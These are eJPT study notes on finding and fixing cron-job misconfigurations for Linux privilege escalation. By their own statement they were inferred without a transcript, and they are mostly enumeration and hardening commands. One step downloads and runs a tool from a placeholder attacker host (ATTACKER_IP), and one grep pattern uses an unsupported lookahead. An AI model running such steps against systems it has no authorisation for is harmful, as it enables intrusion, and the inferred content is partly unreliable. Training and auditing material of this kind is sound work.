# Exploiting Misconfigured Cron Jobs (eJPT Study Notes)

Note: No transcript was provided. The content below is a conservative, lab-oriented summary inferred from the filename and Linux privilege escalation context. Commands focus on enumeration, validation, and remediation you can apply ethically on systems you own or have explicit permission to test.

## What the video covers (Introduction / big picture)
- What cron is: the Linux scheduler that executes commands at fixed times/intervals (system-wide via /etc/crontab and /etc/cron.*; per-user via crontab).
- Why cron misconfigurations matter: tasks often run as root with minimal environment. If scripts, paths, or directories used by cron are writable or unsafe, a low-privileged user can influence what root runs.
- Common misconfig classes:
  - World-writable cron files or scripts called by cron
  - Insecure directory permissions (replace/append scripts in writable dirs)
  - PATH hijacking (cron uses a PATH that includes user-writable directories, and the script calls commands without absolute paths)
  - Wildcard/argument injection (e.g., tar with untrusted wildcards)
  - Weak file ownership/ACLs

## Flow (ordered)
1. Establish context: current user, OS, and service status.
2. Enumerate cron configuration and scheduled jobs (system and user).
3. Enumerate file/directory permissions and ownership for cron-related content.
4. Watch runtime activity to discover hidden or unreadable cron tasks (process monitor).
5. Inspect candidate scripts for hazards (unqualified commands, wildcards, unsafe operations).
6. Check PATH and directory writability relevant to cron jobs.
7. Validate safely in a lab (non-destructive checks) and confirm timing via logs.
8. Document issues and apply or recommend mitigations (fix perms, absolute paths, safe PATH).
9. Re-check to ensure remediation took effect.

## Tools highlighted
- Built-in:
  - crontab, cat, ls, find, stat, grep, awk/sed, env, systemctl/service, journalctl, logger
- Process watcher:
  - pspy (process snooping without root) to observe cron-executed commands in real time
- Enumerators (optional):
  - linpeas.sh (broad PE enumeration)
- File/ACL inspection:
  - getfacl, setfacl (optional)

## Typical command walkthrough (detailed, copy-paste friendly)
All commands below are safe for enumeration/auditing. Use with authorization only.

Baseline/context:
```bash
whoami; id; hostnamectl || uname -a
ps aux | grep -iE 'cron|crond' | grep -v grep
systemctl status cron 2>/dev/null || systemctl status crond 2>/dev/null || service cron status 2>/dev/null || service crond status 2>/dev/null
```

System cron configuration:
```bash
echo "[/etc/crontab]"; sudo -n true 2>/dev/null && cat /etc/crontab || cat /etc/crontab 2>/dev/null
echo "[/etc/cron.* dirs]"; ls -la /etc/cron.d 2>/dev/null; ls -la /etc/cron.daily 2>/dev/null; ls -la /etc/cron.hourly 2>/dev/null; ls -la /etc/cron.weekly 2>/dev/null; ls -la /etc/cron.monthly 2>/dev/null
```

User crontabs (if readable):
```bash
echo "[/var/spool/cron*/]"; ls -la /var/spool/cron 2>/dev/null; ls -la /var/spool/cron/crontabs 2>/dev/null
# List crontabs per user (errors suppressed if not permitted)
for u in $(cut -d: -f1 /etc/passwd); do echo "=== crontab for $u ==="; crontab -u "$u" -l 2>/dev/null || true; done
```

Quick grep for root-run system cron entries and script targets:
```bash
# Likely root lines in system crons
grep -RnsE '^[^#].*\sroot\s' /etc/crontab /etc/cron.d 2>/dev/null
# Extract candidate executable/script paths from crontab-style lines
grep -RnsE '^[^#]' /etc/crontab /etc/cron.d 2>/dev/null | awk -F'\t| +' '{for (i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | sort -u
```

Permission and ownership checks on cron files, scripts, and their parent directories:
```bash
# World/group writable cron-related files
find /etc/cron* /var/spool/cron* -xdev -type f \( -perm -0002 -o -perm -0020 \) -printf "%m %u:%g %p\n" 2>/dev/null

# For each candidate script, show perms and if current user can write either the file or its directory
while read -r f; do
  [ -e "$f" ] || continue
  echo "----- $f"
  stat -c "FILE: %A %a %U:%G %n" "$f" 2>/dev/null
  d=$(dirname "$f"); stat -c "DIR:  %A %a %U:%G %n" "$d" 2>/dev/null
  [ -w "$f" ] && echo "Writable: file"
  [ -w "$d" ] && echo "Writable: directory (replacement risk)"
done <<EOF
$(grep -RnsE '^[^#]' /etc/crontab /etc/cron.d 2>/dev/null | awk -F'\t| +' '{for (i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | sort -u)
EOF
```

Inspect candidate scripts for hazards:
```bash
# Show first 200 lines of each readable script
while read -r f; do [ -r "$f" ] && { echo "=== $f ==="; sed -n '1,200p' "$f"; echo; }; done <<EOF
$(grep -RnsE '^[^#]' /etc/crontab /etc/cron.d 2>/dev/null | awk -F'\t| +' '{for (i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | sort -u)
EOF

# Grep for suspicious patterns: unqualified commands, tar with wildcards, find -exec, etc.
while read -r f; do
  [ -r "$f" ] || continue
  echo "--- Checks in $f"
  grep -nE '\btar\b.*\*' "$f" 2>/dev/null || true
  grep -nE '\bfind\b.*-exec' "$f" 2>/dev/null || true
  # Lines starting with common commands lacking absolute path (heuristic)
  grep -nE '^\s*(tar|cp|mv|rm|bash|sh|python|perl|rsync|awk|sed|gzip|gunzip|chown|chmod)\b(?!/)' "$f" 2>/dev/null || true
done <<EOF
$(grep -RnsE '^[^#]' /etc/crontab /etc/cron.d 2>/dev/null | awk -F'\t| +' '{for (i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | sort -u)
EOF
```

Cron environment and PATH checks:
```bash
# PATH declared for cron (if any)
grep -RnsE '^PATH=' /etc/crontab /etc/cron.d 2>/dev/null

# Typical default PATH for cron if not set is minimal like /usr/bin:/bin on Debian-like systems.
# Check if any PATH dirs are writable by current user (replace PATH_FROM_CRON accordingly if known)
PATH_FROM_CRON=$(grep -RnsE '^PATH=' /etc/crontab /etc/cron.d 2>/dev/null | tail -n1 | sed -E 's/.*PATH=//')
[ -z "$PATH_FROM_CRON" ] && PATH_FROM_CRON="/usr/bin:/bin"
echo "Cron PATH considered: $PATH_FROM_CRON"
IFS=:; for d in $PATH_FROM_CRON; do [ -d "$d" ] && stat -c "%A %a %U:%G %n" "$d"; [ -w "$d" ] && echo "Writable by current user: $d"; done; unset IFS
```

Observe scheduled activity (pspy):
```bash
# Transfer pspy (from your attack box hosting it via Python HTTP server, for example)
# On attacker:   cd /path/with/pspy && python3 -m http.server 8000
# On target:
wget -qO /tmp/pspy64 http://ATTACKER_IP:8000/pspy64 2>/dev/null || curl -fsSL -o /tmp/pspy64 http://ATTACKER_IP:8000/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000
# Watch for recurring root-owned commands and note executable paths and arguments
```

Check cron logs to confirm timing:
```bash
# Debian/Ubuntu:
grep -i cron /var/log/syslog 2>/dev/null | tail -n 100
journalctl -u cron 2>/dev/null | tail -n 100

# RHEL/CentOS:
grep -i cron /var/log/cron 2>/dev/null | tail -n 100
journalctl -u crond 2>/dev/null | tail -n 100
```

Remediation (apply as root, adjust to your policy):
```bash
# Fix perms/ownership of cron files and scripts
chown root:root /etc/crontab /etc/cron.d/* 2>/dev/null
chmod 600 /etc/crontab 2>/dev/null
chmod 644 /etc/cron.d/* 2>/dev/null

# Lock down cron directories
chmod 700 /etc/cron.{daily,hourly,weekly,monthly} 2>/dev/null
chmod 755 /etc/cron.d 2>/dev/null
find /etc/cron* -type f -exec chmod go-w {} \; 2>/dev/null

# Ensure scripts are owned by root and not group/other writable
# Example: harden a script
chown root:root /usr/local/bin/backup.sh 2>/dev/null
chmod 700 /usr/local/bin/backup.sh 2>/dev/null

# Use absolute paths in scripts and set a safe PATH explicitly in cron files
# e.g., add at top of /etc/crontab or specific job file:
# PATH=/usr/sbin:/usr/bin:/sbin:/bin
```

## Practical tips
- Cron runs with a minimal environment. If a script relies on PATH or variables, set them explicitly in the cron file/job.
- Always use absolute paths for invoked commands inside cron scripts.
- If you cannot read user crontabs or some cron files, use pspy to observe executed processes in real time.
- Don’t forget systemd timers; not all scheduled tasks use cron. If nothing shows in cron, check systemd timers (systemctl list-timers).
- Directory permissions matter as much as file permissions: a non-writable file in a writable directory can still be replaced.
- On Debian-like systems, cron logs are often in /var/log/syslog; on RHEL-like, /var/log/cron.
- Use ACLs sparingly; audit with getfacl to ensure no inadvertent write permissions exist for non-root users.
- In reports, classify risks: world-writable script run as root is critical; PATH hijack risk if a PATH directory is user-writable is high.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Enumerate cron
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.{d,daily,hourly,weekly,monthly} 2>/dev/null
for u in $(cut -d: -f1 /etc/passwd); do crontab -u "$u" -l 2>/dev/null; done

# 2) Find root jobs and scripts
grep -RnsE '^[^#].*\sroot\s' /etc/crontab /etc/cron.d 2>/dev/null
CANDS=$(grep -RnsE '^[^#]' /etc/crontab /etc/cron.d 2>/dev/null | awk -F'\t| +' '{for (i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | sort -u)

# 3) Permissions
find /etc/cron* /var/spool/cron* -xdev -type f \( -perm -0002 -o -perm -0020 \) -printf "%m %u:%g %p\n" 2>/dev/null
for f in $CANDS; do stat -c "%A %a %U:%G %n" "$f" 2>/dev/null; d=$(dirname "$f"); stat -c "DIR %A %a %U:%G %n" "$d" 2>/dev/null; done

# 4) Script hazards
for f in $CANDS; do [ -r "$f" ] && { grep -nE '\btar\b.*\*' "$f"; grep -nE '^\s*(tar|cp|mv|rm|bash|sh|python|perl|rsync|awk|sed|gzip|gunzip|chown|chmod)\b(?!/)' "$f"; }; done

# 5) PATH for cron (and writable dirs)
CPATH=$(grep -RnsE '^PATH=' /etc/crontab /etc/cron.d 2>/dev/null | tail -n1 | sed -E 's/.*PATH=//')
[ -z "$CPATH" ] && CPATH="/usr/bin:/bin"
IFS=:; for d in $CPATH; do [ -w "$d" ] && echo "Writable PATH dir: $d"; done; unset IFS

# 6) Observe at runtime (pspy)
# wget/curl pspy64 to /tmp and run: /tmp/pspy64 -pf -i 1000
```

## Summary
- Cron jobs are a frequent Linux privilege escalation vector because they run unattended—often as root—with limited environment. Misconfigurations in files, directories, PATH, and command usage can allow low-privileged users to influence what root executes.
- Your workflow: enumerate cron sources, identify root-run tasks, assess permissions and ownership, inspect scripts for insecure patterns (unqualified commands, wildcards), check PATH against writable directories, and observe runtime with pspy. Validate responsibly in a lab and remediate by enforcing least privilege: root ownership, no world/group write, absolute paths, safe PATH, and careful use of wildcards.
- Because no transcript was provided, commands above reflect standard eJPT-style methodology for auditing and understanding cron-based privilege escalation in a legitimate, authorized environment.